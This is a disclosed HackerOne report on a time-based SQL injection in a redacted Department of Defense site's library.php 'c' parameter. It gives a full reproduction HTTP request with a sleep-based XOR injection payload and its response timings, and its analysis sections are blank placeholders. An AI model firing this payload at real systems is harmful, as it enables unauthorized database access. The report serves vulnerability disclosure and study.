---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1024984'
original_report_id: '1024984'
title: '[SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter'
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2020-11-03T04:17:44.887Z'
disclosed_at: '2020-11-23T18:07:06.967Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- sql-injection
---

# [SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter

## Metadata

- HackerOne Report ID: 1024984
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2020-11-23T18:07:06.967Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Step-by-step Reproduction Instructions
 copy the request to your burp suite :
````
GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
Host: ██████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Connection: close
````

```
payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis
```

██████████


```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis
```
████████

```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis
```
███


This issue is same to #995122

## Impact

SQL Injection

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
